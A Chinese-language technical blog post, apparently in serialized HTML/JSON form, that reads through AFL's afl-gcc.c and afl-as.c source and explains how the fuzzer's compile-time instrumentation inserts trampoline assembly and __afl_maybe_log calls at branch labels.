捕捉跳转标志，调用随机数函数，选择是否进行插桩</span></span><br><span class=\"line\">      <span class=\"keyword\">continue</span>;</span><br><span class=\"line\"></span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\">/* Label of some sort. This may be a branch destination, but we need to</span></span><br><span class=\"line\"><span class=\"comment\">       tread carefully and account for several different formatting</span></span><br><span class=\"line\"><span class=\"comment\">       conventions. */</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">ifdef</span> __APPLE__</span></span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\">/* Apple: L&lt;whatever&gt;&lt;digit&gt;: */</span></span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">if</span> ((colon_pos = <span class=\"built_in\">strstr</span>(line, <span class=\"string\">&quot;:&quot;</span>))) &#123;</span><br><span class=\"line\"></span><br><span class=\"line\">      <span class=\"keyword\">if</span> (line[<span class=\"number\">0</span>] == <span class=\"string\">&#x27;L&#x27;</span> &amp;&amp; <span class=\"built_in\">isdigit</span>(*(colon_pos - <span class=\"number\">1</span>))) &#123;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">else</span></span></span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\">/* Everybody else: .L&lt;whatever&gt;: */</span></span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">if</span> (<span class=\"built_in\">strstr</span>(line, <span class=\"string\">&quot;:&quot;</span>)) &#123;</span><br><span class=\"line\"></span><br><span class=\"line\">      <span class=\"keyword\">if</span> (line[<span class=\"number\">0</span>] == <span class=\"string\">&#x27;.&#x27;</span>) &#123;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">endif</span> <span class=\"comment\">/* __APPLE__ */</span></span></span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"comment\">/* .L0: or LBB0_0: style jump destination */</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">ifdef</span> __APPLE__</span></span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"comment\">/* Apple: L&lt;num&gt; / LBB&lt;num&gt; */</span></span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"keyword\">if</span> ((<span class=\"built_in\">isdigit</span>(line[<span class=\"number\">1</span>]) || (clang_mode &amp;&amp; !<span class=\"built_in\">strncmp</span>(line, <span class=\"string\">&quot;LBB&quot;</span>, <span class=\"number\">3</span>)))</span><br><span class=\"line\">            &amp;&amp; R(<span class=\"number\">100</span>) &lt; inst_ratio) &#123;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">else</span></span></span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"comment\">/* Apple: .L&lt;num&gt; / .LBB&lt;num&gt; */</span></span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"keyword\">if</span> ((<span class=\"built_in\">isdigit</span>(line[<span class=\"number\">2</span>]) || (clang_mode &amp;&amp; !<span class=\"built_in\">strncmp</span>(line + <span class=\"number\">1</span>, <span class=\"string\">&quot;LBB&quot;</span>, <span class=\"number\">3</span>)))</span><br><span class=\"line\">            &amp;&amp; R(<span class=\"number\">100</span>) &lt; inst_ratio) &#123;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">endif</span> <span class=\"comment\">/* __APPLE__ */</span></span></span><br><span class=\"line\"></span><br><span class=\"line\">          <span class=\"comment\">/* An optimization is possible here by adding the code only if the</span></span><br><span class=\"line\"><span class=\"comment\">             label is mentioned in the code in contexts other than call / jmp.</span></span><br><span class=\"line\"><span class=\"comment\">             That said, this complicates the code by requiring two-pass</span></span><br><span class=\"line\"><span class=\"comment\">             processing (messy with stdin), and results in a speed gain</span></span><br><span class=\"line\"><span class=\"comment\">             typically under 10%, because compilers are generally pretty good</span></span><br><span class=\"line\"><span class=\"comment\">             about not generating spurious intra-function jumps.</span></span><br><span class=\"line\"><span class=\"comment\"></span></span><br><span class=\"line\"><span class=\"comment\">             We use deferred output chiefly to avoid disrupting</span></span><br><span class=\"line\"><span class=\"comment\">             .Lfunc_begin0-style exception handling calculations (a problem on</span></span><br><span class=\"line\"><span class=\"comment\">             MacOS X). */</span></span><br><span class=\"line\"></span><br><span class=\"line\">          <span class=\"keyword\">if</span> (!skip_next_label) instrument_next = <span class=\"number\">1</span>; <span class=\"keyword\">else</span> skip_next_label = <span class=\"number\">0</span>;</span><br><span class=\"line\"></span><br><span class=\"line\">        &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">      &#125; <span class=\"keyword\">else</span> &#123;</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"comment\">/* Function label (always instrumented, deferred mode). */</span></span><br><span class=\"line\"></span><br><span class=\"line\">        instrument_next = <span class=\"number\">1</span>;</span><br><span class=\"line\">    </span><br><span class=\"line\">      &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">  &#125;</span><br></pre></td></tr></table></figure>\n<h5 id=\"b-trampoline插桩代码\">b. trampoline插桩代码</h5>\n<p>这些部分的声明在afl-as.h</p>\n<h6 id=\"b-1-bss段变量\">b-1 .bss段变量</h6>\n<ul>\n<li><code>__afl_area_ptr</code>：共享内存地址；</li>\n<li><code>__afl_prev_loc</code>：上一个插桩位置（id为R(100)随机数的值）；</li>\n<li><code>__afl_fork_pid</code>：由fork产生的子进程的pid；</li>\n<li><code>__afl_temp</code>：缓冲区；</li>\n<li><code>__afl_setup_failure</code>：标志位，如果置位则直接退出；</li>\n<li><code>__afl_global_area_ptr</code>：全局指针。</li>\n</ul>\n<h6 id=\"b-1-trampoline-fmt-64-32\">b-1.trampoline_fmt_64/32</h6>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">static const u8* trampoline_fmt_32 =</span><br><span class=\"line\"></span><br><span class=\"line\">  &quot;\\n&quot;</span><br><span class=\"line\">  &quot;/* --- AFL TRAMPOLINE (32-BIT) --- */\\n&quot;</span><br><span class=\"line\">  &quot;\\n&quot;</span><br><span class=\"line\">  &quot;.align 4\\n&quot;</span><br><span class=\"line\">  &quot;\\n&quot;</span><br><span class=\"line\">  &quot;leal -16(%%esp), %%esp\\n&quot;</span><br><span class=\"line\">  &quot;movl %%edi,  0(%%esp)\\n&quot;</span><br><span class=\"line\">  &quot;movl %%edx,  4(%%esp)\\n&quot;</span><br><span class=\"line\">  &quot;movl %%ecx,  8(%%esp)\\n&quot;</span><br><span class=\"line\">  &quot;movl %%eax, 12(%%esp)\\n&quot;</span><br><span class=\"line\">  &quot;movl $0x%08x, %%ecx\\n&quot;  //想ecx存入随机桩代码</span><br><span class=\"line\">  &quot;call __afl_maybe_log\\n&quot; //调用__afl_maybe_log</span><br><span class=\"line\">  &quot;movl 12(%%esp), %%eax\\n&quot;</span><br><span class=\"line\">  &quot;movl  8(%%esp), %%ecx\\n&quot;</span><br><span class=\"line\">  &quot;movl  4(%%esp), %%edx\\n&quot;</span><br><span class=\"line\">  &quot;movl  0(%%esp), %%edi\\n&quot;</span><br><span class=\"line\">  &quot;leal 16(%%esp), %%esp\\n&quot;</span><br><span class=\"line\">  &quot;\\n&quot;</span><br><span class=\"line\">  &quot;/* --- END --- */\\n&quot;</span><br><span class=\"line\">  &quot;\\n&quot;;</span><br><span class=\"line\"></span><br><span class=\"line\">static const u8* trampoline_fmt_64 =</span><br><span class=\"line\"></span><br><span class=\"line\">  &quot;\\n&quot;</span><br><span class=\"line\">  &quot;/* --- AFL TRAMPOLINE (64-BIT) --- */\\n&quot;</span><br><span class=\"line\">  &quot;\\n&quot;</span><br><span class=\"line\">  &quot;.align 4\\n&quot;</span><br><span class=\"line\">  &quot;\\n&quot;</span><br><span class=\"line\">  &quot;leaq -(128+24)(%%rsp), %%rsp\\n&quot;</span><br><span class=\"line\">  &quot;movq %%rdx,  0(%%rsp)\\n&quot;</span><br><span class=\"line\">  &quot;movq %%rcx,  8(%%rsp)\\n&quot;</span><br><span class=\"line\">  &quot;movq %%rax, 16(%%rsp)\\n&quot;</span><br><span class=\"line\">  &quot;movq $0x%08x, %%rcx\\n&quot;</span><br><span class=\"line\">  &quot;call __afl_maybe_log\\n&quot;</span><br><span class=\"line\">  &quot;movq 16(%%rsp), %%rax\\n&quot;</span><br><span class=\"line\">  &quot;movq  8(%%rsp), %%rcx\\n&quot;</span><br><span class=\"line\">  &quot;movq  0(%%rsp), %%rdx\\n&quot;</span><br><span class=\"line\">  &quot;leaq (128+24)(%%rsp), %%rsp\\n&quot;</span><br><span class=\"line\">  &quot;\\n&quot;</span><br><span class=\"line\">  &quot;/* --- END --- */\\n&quot;</span><br><span class=\"line\">  &quot;\\n&quot;;</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n<p>主要功能:</p>\n<ul>\n<li>保存 <code>rdx</code>、 <code>rcx</code> 、<code>rax</code> 寄存器</li>\n<li>将 <code>rcx</code> 的值设置为 <code>fprintf()</code> 函数将要打印的变量内容</li>\n<li>调用 <code>__afl_maybe_log</code> 函数</li>\n<li>恢复寄存器</li>\n</ul>\n<h6 id=\"b-2-afl-maybe-log\">b-2. __afl_maybe_log</h6>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"string\">&quot;__afl_maybe_log:\\n&quot;</span></span><br><span class=\"line\"><span class=\"string\">&quot;\\n&quot;</span></span><br><span class=\"line\"><span class=\"string\">&quot;  lahf\\n&quot;</span>   <span class=\"comment\">// 对于标志位的处理</span></span><br><span class=\"line\"><span class=\"string\">&quot;  seto %al\\n&quot;</span> </span><br><span class=\"line\"><span class=\"string\">&quot;\\n&quot;</span></span><br><span class=\"line\"><span class=\"string\">&quot;  /* Check if SHM region is already mapped. */\\n&quot;</span></span><br><span class=\"line\"><span class=\"string\">&quot;\\n&quot;</span></span><br><span class=\"line\"><span class=\"string\">&quot;  movl  __afl_area_ptr, %edx\\n&quot;</span></span><br><span class=\"line\"><span class=\"string\">&quot;  testl %edx, %edx\\n&quot;</span>    <span class=\"comment\">//判断__afl_area_ptr是否为NULL</span></span><br><span class=\"line\"><span class=\"string\">&quot;  je    __afl_setup\\n&quot;</span>\t<span class=\"comment\">//为NULL则跳转设置</span></span><br><span class=\"line\"><span class=\"string\">&quot;\\n&quot;</span></span><br></pre></td></tr></table></figure>\n","site":{"data":{}},"excerpt":"","more":"<p>AFL源代码阅读[1]， 主要包含对afl-gcc.c 和afl-as.c的流程分析，也即插桩的过程。而插桩后进程间通信的过程相对复杂，将在后面单独分析。</p>\n<h1 id=\"0x1-文件依赖结构\">0x1 文件依赖结构</h1>\n<p>基本文件结构:</p>\n<ul>\n<li><strong>afl-as.c、afl-as.h、afl-gcc.c</strong> :普通的代码插桩</li>\n<li><strong>afl-fuzz.c</strong><br>\nfuzzer实现代码 核心</li>\n<li>llvm_mode<br>\nllvm模式进行插桩，仅clang适用</li>\n<li>qemu_mode<br>\nqemu模式插桩，针对二进制文件</li>\n<li>libdislocator<br>\n简单的内存检测工具</li>\n<li>libtokencap<br>\n语法关键字提取并生成字典文件</li>\n<li>afl-analyze.c<br>\n对测试样例的字典进行分析</li>\n<li>afl_cmin<br>\n对fuzzing用到的语料库进行精简操作</li>\n<li>afl_tmin.c<br>\n对fuzzing中用到的测试用例进行最小化操作</li>\n<li>afl-gotcpu.c<br>\n统计cpu占用率</li>\n<li>afl-plot<br>\n绘制报告图标</li>\n<li>afl-showmap.c<br>\n打印目标程序fuzz后的tuple信息</li>\n<li>afl-whatsup<br>\n并行fuzz结果统计</li>\n<li>alloc-inl.h<br>\n定义带检测功能的内存分配和释放操作</li>\n<li>Hash.h<br>\nhash函数的实现和定义</li>\n<li>test-instr.c<br>\n测试的目标程序</li>\n<li>dos<br>\n相关说明文档</li>\n<li>experimental<br>\n一些新特性的试验研究</li>\n</ul>\n<h1 id=\"0x2-基本模块分析\">0x2 基本模块分析</h1>\n<h2 id=\"1-代码插桩\">(1)代码插桩</h2>\n<p>基本流程: afl-gcc  --&gt;  afl-as</p>\n<h3 id=\"afl-gcc-c\">afl-gcc.c</h3>\n<h4 id=\"0x1-基础变量\">0x1.基础变量</h4>\n<table>\n<thead>\n<tr>\n<th>name</th>\n<th>meaning</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td>static u8*  as_path</td>\n<td><em>Path to the AFL ‘as’ wrapper</em></td>\n</tr>\n<tr>\n<td>static u8** cc_params</td>\n<td><em>Parameters passed to the real CC</em></td>\n</tr>\n<tr>\n<td>static u32  cc_par_cnt = 1</td>\n<td><em>Param count, including argv0</em></td>\n</tr>\n<tr>\n<td>static u8  be_quiet</td>\n<td><em>Quiet mode</em></td>\n</tr>\n<tr>\n<td>static u8 clang_mode</td>\n<td><em>Invoked as afl-clang?</em></td>\n</tr>\n</tbody>\n</table>\n<h4 id=\"0x2-main函数核心流程\">0x2.main函数核心流程</h4>\n<p>a.检查是否是静默模式</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">if</span> (isatty(<span class=\"number\">2</span>) &amp;&amp; !getenv(<span class=\"string\">&quot;AFL_QUIET&quot;</span>)) &#123;</span><br><span class=\"line\"></span><br><span class=\"line\">SAYF(cCYA <span class=\"string\">&quot;afl-cc &quot;</span> cBRI VERSION cRST <span class=\"string\">&quot; by &lt;lcamtuf@google.com&gt;\\n&quot;</span>);</span><br><span class=\"line\"></span><br><span class=\"line\">&#125; <span class=\"keyword\">else</span> be_quiet = <span class=\"number\">1</span>;</span><br></pre></td></tr></table></figure>\n<p>b. 检查参数是否完备</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">if</span> (argc &lt; <span class=\"number\">2</span>) &#123;</span><br><span class=\"line\"></span><br><span class=\"line\">SAYF(<span class=\"string\">&quot;\\n&quot;</span></span><br><span class=\"line\">     <span class=\"string\">&quot;This is a helper application for afl-fuzz. It serves as a drop-in replacement\\n&quot;</span></span><br><span class=\"line\">     <span class=\"string\">&quot;for gcc or clang, letting you recompile third-party code with the required\\n&quot;</span></span><br><span class=\"line\">     <span class=\"string\">&quot;runtime instrumentation. A common use pattern would be one of the following:\\n\\n&quot;</span></span><br><span class=\"line\"></span><br><span class=\"line\">     <span class=\"string\">&quot;  CC=%s/afl-gcc ./configure\\n&quot;</span></span><br><span class=\"line\">     <span class=\"string\">&quot;  CXX=%s/afl-g++ ./configure\\n\\n&quot;</span></span><br><span class=\"line\"></span><br><span class=\"line\">     <span class=\"string\">&quot;You can specify custom next-stage toolchain via AFL_CC, AFL_CXX, and AFL_AS.\\n&quot;</span></span><br><span class=\"line\">     <span class=\"string\">&quot;Setting AFL_HARDEN enables hardening optimizations in the compiled code.\\n\\n&quot;</span>,</span><br><span class=\"line\">     BIN_PATH, BIN_PATH);</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"built_in\">exit</span>(<span class=\"number\">1</span>);</span><br><span class=\"line\"></span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>c. 找到as路径</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">find_as(argv[<span class=\"number\">0</span>]);</span><br></pre></td></tr></table></figure>\n<p>d. 对于参数进行编辑</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">edit_params(argc, argv);</span><br></pre></td></tr></table></figure>\n<p>e. 调用</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">execvp(cc_params[<span class=\"number\">0</span>], (<span class=\"type\">char</span>**)cc_params);</span><br></pre></td></tr></table></figure>\n<h4 id=\"0x3-edit-params\">0x3.edit_params()</h4>\n<p>edit_params()被调用于编辑各种参数.  最后传递给真正的编译器(gcc / clang)，对于as的路径进行处理，使之调用到as的封装, afl-as。</p>\n<p>//主要是一些细节方面的，之后遇到了再来仔细查看</p>\n<h4 id=\"0x4-find-as\">0x4. find_as()</h4>\n<p>通过环境变量AFL_PATH找到封装的as的路径</p>\n<p>//同样主要是细节方面</p>\n<h3 id=\"afl-as-c\">afl-as.c</h3>\n<h4 id=\"0x1-基础变量-2\">0x1. 基础变量</h4>\n<table>\n<thead>\n<tr>\n<th>NAME</th>\n<th>MEANING</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td>static u8** as_params</td>\n<td><em>Parameters passed to the real ‘as’</em></td>\n</tr>\n<tr>\n<td>static u8*  input_file</td>\n<td><em>Originally specified input file</em></td>\n</tr>\n<tr>\n<td>static u8*  modified_file</td>\n<td><em>Instrumented file for the real ‘as’</em></td>\n</tr>\n<tr>\n<td>static u32  inst_ratio = 100</td>\n<td><em>Instrumentation probability (%)</em></td>\n</tr>\n</tbody>\n</table>\n<h4 id=\"0x2-main函数主要逻辑\">0x2. main函数主要逻辑</h4>\n<p>a. 同上，对各种模式的判断(这里和上面都对于APPLE都有不同，因为没接触过apple，暂且记下)</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">clang_mode = !!getenv(CLANG_ENV_VAR);</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">if</span> (isatty(<span class=\"number\">2</span>) &amp;&amp; !getenv(<span class=\"string\">&quot;AFL_QUIET&quot;</span>)) &#123;</span><br><span class=\"line\"></span><br><span class=\"line\">SAYF(cCYA <span class=\"string\">&quot;afl-as &quot;</span> cBRI VERSION cRST <span class=\"string\">&quot; by &lt;lcamtuf@google.com&gt;\\n&quot;</span>);</span><br><span class=\"line\"></span><br><span class=\"line\">&#125; <span class=\"keyword\">else</span> be_quiet = <span class=\"number\">1</span>;</span><br></pre></td></tr></table></figure>\n<p>b. 获取随机数种子</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">gettimeofday(&amp;tv, &amp;tz);</span><br><span class=\"line\"></span><br><span class=\"line\">rand_seed = tv.tv_sec ^ tv.tv_usec ^ getpid();</span><br><span class=\"line\"></span><br><span class=\"line\">srandom(rand_seed);</span><br></pre></td></tr></table></figure>\n<p>c. 编辑参数</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">edit_params(argc, argv);</span><br></pre></td></tr></table></figure>\n<p>d. 根据各种环境变量进行相关配置</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">  <span class=\"keyword\">if</span> (inst_ratio_str) &#123;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">if</span> (<span class=\"built_in\">sscanf</span>(inst_ratio_str, <span class=\"string\">&quot;%u&quot;</span>, &amp;inst_ratio) != <span class=\"number\">1</span> || inst_ratio &gt; <span class=\"number\">100</span>) </span><br><span class=\"line\">      FATAL(<span class=\"string\">&quot;Bad value of AFL_INST_RATIO (must be between 0 and 100)&quot;</span>);</span><br><span class=\"line\"></span><br><span class=\"line\">  &#125;</span><br><span class=\"line\"><span class=\"comment\">// 代码插桩率的设置</span></span><br><span class=\"line\"></span><br><span class=\"line\">  <span class=\"keyword\">if</span> (getenv(AS_LOOP_ENV_VAR))</span><br><span class=\"line\">    FATAL(<span class=\"string\">&quot;Endless loop when calling &#x27;as&#x27; (remove &#x27;.&#x27; from your PATH)&quot;</span>);</span><br><span class=\"line\"></span><br><span class=\"line\">  setenv(AS_LOOP_ENV_VAR, <span class=\"string\">&quot;1&quot;</span>, <span class=\"number\">1</span>);</span><br><span class=\"line\"></span><br><span class=\"line\">  <span class=\"comment\">/* When compiling with ASAN, we don&#x27;t have a particularly elegant way to skip</span></span><br><span class=\"line\"><span class=\"comment\">     ASAN-specific branches. But we can probabilistically compensate for</span></span><br><span class=\"line\"><span class=\"comment\">     that... */</span></span><br><span class=\"line\"></span><br><span class=\"line\">  <span class=\"keyword\">if</span> (getenv(<span class=\"string\">&quot;AFL_USE_ASAN&quot;</span>) || getenv(<span class=\"string\">&quot;AFL_USE_MSAN&quot;</span>)) &#123;</span><br><span class=\"line\">    sanitizer = <span class=\"number\">1</span>;</span><br><span class=\"line\">    inst_ratio /= <span class=\"number\">3</span>;</span><br><span class=\"line\">  &#125;</span><br></pre></td></tr></table></figure>\n<p>e. 代码插桩</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">if</span> (!just_version) add_instrumentation();</span><br></pre></td></tr></table></figure>\n<p>f. 调用as</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">if</span> (!(pid = fork())) &#123;</span><br><span class=\"line\"></span><br><span class=\"line\">  execvp(as_params[<span class=\"number\">0</span>], (<span class=\"type\">char</span>**)as_params);</span><br><span class=\"line\">  FATAL(<span class=\"string\">&quot;Oops, failed to execute &#x27;%s&#x27; - check your PATH&quot;</span>, as_params[<span class=\"number\">0</span>]);</span><br><span class=\"line\"></span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">if</span> (pid &lt; <span class=\"number\">0</span>) PFATAL(<span class=\"string\">&quot;fork() failed&quot;</span>);</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">if</span> (waitpid(pid, &amp;status, <span class=\"number\">0</span>) &lt;= <span class=\"number\">0</span>) PFATAL(<span class=\"string\">&quot;waitpid() failed&quot;</span>);</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">if</span> (!getenv(<span class=\"string\">&quot;AFL_KEEP_ASSEMBLY&quot;</span>)) unlink(modified_file);</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"built_in\">exit</span>(WEXITSTATUS(status));</span><br></pre></td></tr></table></figure>\n<h4 id=\"0x3-add-instrumentation-代码插桩\">0x3. add_instrumentation()代码插桩</h4>\n<h5 id=\"a-主要流程\">a. 主要流程</h5>\n<p>a-1. 打开输入文件和更改后的输出文件</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">if</span> (input_file) &#123;</span><br><span class=\"line\"></span><br><span class=\"line\">  inf = fopen(input_file, <span class=\"string\">&quot;r&quot;</span>);</span><br><span class=\"line\">  <span class=\"keyword\">if</span> (!inf) PFATAL(<span class=\"string\">&quot;Unable to read &#x27;%s&#x27;&quot;</span>, input_file);</span><br><span class=\"line\"></span><br><span class=\"line\">&#125; <span class=\"keyword\">else</span> inf = <span class=\"built_in\">stdin</span>;</span><br><span class=\"line\"></span><br><span class=\"line\">outfd = open(modified_file, O_WRONLY | O_EXCL | O_CREAT, <span class=\"number\">0600</span>);</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">if</span> (outfd &lt; <span class=\"number\">0</span>) PFATAL(<span class=\"string\">&quot;Unable to write to &#x27;%s&#x27;&quot;</span>, modified_file);</span><br><span class=\"line\"></span><br><span class=\"line\">outf = fdopen(outfd, <span class=\"string\">&quot;w&quot;</span>);</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">if</span> (!outf) PFATAL(<span class=\"string\">&quot;fdopen() failed&quot;</span>);  </span><br></pre></td></tr></table></figure>\n<p>a-2. 读取每一行到line数组</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">  <span class=\"keyword\">while</span> (fgets(line, MAX_LINE, inf)) &#123;<span class=\"comment\">//这个括号匹配到最后</span></span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\">/* In some cases, we want to defer writing the instrumentation trampoline</span></span><br><span class=\"line\"><span class=\"comment\">       until after all the labels, macros, comments, etc. If we&#x27;re in this</span></span><br><span class=\"line\"><span class=\"comment\">       mode, and if the line starts with a tab followed by a character, dump</span></span><br><span class=\"line\"><span class=\"comment\">       the trampoline now. */</span></span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">if</span> (!pass_thru &amp;&amp; !skip_intel &amp;&amp; !skip_app &amp;&amp; !skip_csect &amp;&amp; instr_ok &amp;&amp;</span><br><span class=\"line\">        instrument_next &amp;&amp; line[<span class=\"number\">0</span>] == <span class=\"string\">&#x27;\\t&#x27;</span> &amp;&amp; <span class=\"built_in\">isalpha</span>(line[<span class=\"number\">1</span>])) &#123;</span><br><span class=\"line\"></span><br><span class=\"line\">      <span class=\"built_in\">fprintf</span>(outf, use_64bit ? trampoline_fmt_64 : trampoline_fmt_32,</span><br><span class=\"line\">              R(MAP_SIZE));</span><br><span class=\"line\"><span class=\"comment\">// 这里是defered mode插桩执行语句</span></span><br><span 